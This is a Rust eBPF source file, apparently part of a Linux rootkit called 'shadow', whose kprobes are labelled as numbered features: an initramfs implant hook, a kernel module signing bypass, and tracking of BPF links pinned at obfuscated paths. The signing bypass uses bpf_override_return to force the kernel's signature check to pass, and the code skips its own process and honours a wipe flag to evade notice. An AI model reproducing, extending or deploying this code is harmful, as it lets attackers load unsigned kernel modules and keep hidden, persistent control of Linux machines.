use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{
    EventHeader, EVENT_BPF_LINK_PINNED, EVENT_INITRAMFS_IMPLANT, EVENT_MODSIGN_BYPASS,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 45: Initramfs Implant
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_init_module(ctx: ProbeContext) -> u32 {
    try_init_module(&ctx).unwrap_or_default()
}

fn try_init_module(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { INITRAMFS_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let mod_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let mod_name_ptr: u64 =
        unsafe { bpf_probe_read_kernel((mod_ptr + 24) as *const u64)? };
    let first_byte: u8 = unsafe { bpf_probe_read_kernel(mod_name_ptr as *const u8)? };

    if first_byte == 0 {
        return Ok(0);
    }

    let event = EventHeader {
        event_type: EVENT_INITRAMFS_IMPLANT,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: mod_ptr,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 46: Kernel Module Signing Bypass
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_module_sig_check(ctx: ProbeContext) -> u32 {
    try_module_sig_check(&ctx).unwrap_or_default()
}

fn try_module_sig_check(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { MODSIGN_BYPASS_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    #[cfg(target_arch = "bpf")]
    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_override_return(ctx.as_ptr() as *mut _, 0u64);
    }

    let event = EventHeader {
        event_type: EVENT_MODSIGN_BYPASS,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 0,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 47: BPF Link Pinning with Obfuscated Paths
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_bpf_obj_get(ctx: ProbeContext) -> u32 {
    try_bpf_obj_get(&ctx).unwrap_or_default()
}

fn try_bpf_obj_get(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let attr_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let pathname_ptr: u64 = unsafe { bpf_probe_read_kernel(attr_ptr as *const u64)? };

    let first_bytes: [u8; 4] =
        unsafe { bpf_probe_read_kernel(pathname_ptr as *const [u8; 4])? };

    let path_hash: u32 = u32::from_ne_bytes(first_bytes);
    if unsafe { BPF_PIN_PATHS.get(&path_hash) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_BPF_LINK_PINNED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: pathname_ptr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
